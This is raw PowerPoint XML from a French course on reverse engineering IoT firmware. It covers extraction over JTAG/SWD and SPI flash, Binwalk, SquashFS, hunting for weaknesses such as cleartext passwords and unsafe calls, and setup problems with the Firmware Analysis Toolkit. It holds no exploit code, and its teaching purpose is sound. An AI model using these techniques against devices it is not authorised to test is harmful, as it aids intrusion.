            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>accéder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à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adresse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Adressage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> indirect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Référence</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> à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adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contenue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>registre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D69F6-03D7-088A-A9E4-8BDDB9DF0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411567"/>
            <a:ext cx="7772400" cy="244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7379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F83686-4D99-6B40-1D5D-C683E9EB2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Reverse Engineering IoT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62144E-AA27-926B-234F-9048386675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5913987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66265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FDAD5-A77E-0AD4-5105-2201BAC5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Objectifs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du Reverse Engineering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6A9A9-A078-706D-9C7E-F036DFA67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Comprendre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’architecture</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du firmware.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Identifier les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>composants</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>système</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, configurations).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Analyser la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sécurité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>trouver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>failles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des mots de passe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clair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Exemples</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'applications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Recherche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cybersécurité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Analyse de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>conformité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99558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32FA93-C7F3-7084-00D8-D03D40C9D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Approche Générale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82DD5E-64FA-97E5-0D9E-09BE94C196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4150183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49161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51DD-68AA-D530-23B4-912C1EA4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Extraction Physique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6F3E5-E980-3813-58E8-071E4E600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Méthodes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Connexion JTAG/SWD : Debugging direct.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Mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> flash SPI/NAND : Dump des données via des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>spécialisés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (ex. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Flashrom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Outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> courants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Bus Pirate.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OpenOCD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Analyseur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>logique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18799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D14C22-1490-6F3F-D280-EC98BF30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Extraction Logique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4EAEB-673D-FE25-6F9F-159912375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Téléchargement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/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Site </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>officiel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du fabricant.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err="1"/>
              <a:t>Récupération</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via des API </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>publiques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Sniffing OTA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/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Capture des process de mises à jour avec un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>outil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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>TCPDump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> / Wireshark.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4116826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B65C-F6D7-94D8-0297-A756463A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Exploration avec </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Binwalk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D6DBB-F4E3-B1C6-50FF-99E0ACB21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Binwalk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Un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>outil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour analyser et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>extraire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, headers, et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>autres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>éléments</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>intégrés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Utilité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/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Identifier les signatures de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (e.g., JPEG, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>SquashFS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>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err="1"/>
              <a:t>Extraire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>automatiquement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>compressés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Limites</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Binwalk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> ne </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pourra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pas </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>toujours</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> tout </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>extraire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439419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13586-A5A1-421E-97F2-878CDC2E9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Systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Embarqués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BA7B-D0F0-91B5-14BB-320D49A8F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Exemples</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> courants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SquashFS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : Lecture </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>seule</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, compact.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JFFS2, YAFFS : Pour les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> flash.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Unsquashfs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Décompression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>SquashFS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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>commande</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> :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09030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573FA-9F08-53C1-1874-46E8924AC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Détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Vulnérabilités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7B0C0-BD43-C387-C842-E90099ECF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Rechercher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Mots de passe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clair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Ports de diagnostic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>laissés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ouverts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Appels à des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonctions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sécurisées</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>strcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> au lieu de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>strncpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Appels à des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonctions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>problématiques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> function du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>langage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (e.g. exec() pour PHP)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Outils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Grep pour les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chaînes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sensibles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7921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69F72C-E3FB-4C48-AEBD-AF7AC0D74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A22715-D05D-465E-A9CB-5AD7BC6C9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0F90E-84BA-F670-1A6F-69E18086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180" y="2288987"/>
            <a:ext cx="4009639" cy="2283013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Comprendre la Communication Interne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CD19-44FF-3D34-A626-08922C521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435" y="762000"/>
            <a:ext cx="4338577" cy="3048000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr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Analyse des logs et traces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Récupérer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>journaux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via UART.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Inspection des messages pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>révéler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>informations</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>potentiellement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sensibles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13A18CAE-BE8D-EFDB-F733-7D23F060D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4645" y="4309035"/>
            <a:ext cx="1786965" cy="178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48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DD616-9196-0D17-04BA-C811B5D5C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FAT !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928E3D-6673-358F-7897-B2BA451595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6414933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50040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330D-5E74-A77C-7A8C-23202362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Fonctionnalités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Principales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FC712-D2A1-E720-7F6A-56CD4A619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Extraction </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>automatique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> firmware.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Détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérabilités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>courantes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Support pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'émulation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> avec QEMU.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Analyse des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>intégrés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Préparation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>environnements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour tests </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dynamiques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26815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D284-CA07-0C44-CA15-DBB47213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Architecture de FAT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5FCB9-AE64-FB36-76CA-1225AACC4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Composants</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>clés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Binwalk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : Analyse et extraction des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers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QEMU : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Émulation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>firmwares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Unsquashfs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Décompression</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers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Scripts Python : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Automatisation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>tâches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Flux de travail </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>typique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Charger le firmware.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Extraire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>intégrés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Configurer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'émulation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Effectuer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les tests de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sécurité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15795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AB929-A498-3A24-FAD4-E6AE88C4F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Installation de Firmware Analysis Toolkit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A181C-685E-7E9F-0CD6-761DCBE81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C’est (devenu) compliqué</a:t>
            </a:r>
          </a:p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Python 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>déprécié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Python 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>n'est</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> plus pris </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> charge sur la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>plupart</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des distributions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>modernes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Solutions possibles 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Utiliser un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>conteneur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Docker.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Installer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ancienne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> version de Python via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pyenv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/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 err="1"/>
              <a:t>Attify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> !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06329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13657-A9DE-60A6-B14F-E967D5927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Encore des problèmes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1A39F-AB16-6B00-7348-00B84DC4C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Binwalk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passé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b="1" dirty="0"/>
              <a:t>version 3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> avec un support Python 3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>uniquement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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Note: binwalk3 à </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>été</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>repris</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>zéro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Rust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FAT repose sur </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> version plus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ancienne</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Binwalk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pré</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> py3)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93668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D339-F337-C37B-32EF-42930B2B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Toujours des problèmes…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67F9F-E98F-4543-9FD8-7EE1C5736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Unsquashfs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Utilisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>extraire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>SquashFS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Problème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Certaines</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> versions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>modernes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'Unsquashfs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> ne </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sont</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pas compatibles avec les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>anciens</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> scripts FAT.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Finalement, c’est grave ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>	Oui. (conservation du FS)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="225714430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1BAD7-6EA8-D8DF-C1C6-70CEC6CA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Netgear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61018-7CB3-24B0-3109-B388E21A2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dirty="0"/>
              <a:t>Nous allons donc analyser un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>firmware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> de chez </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
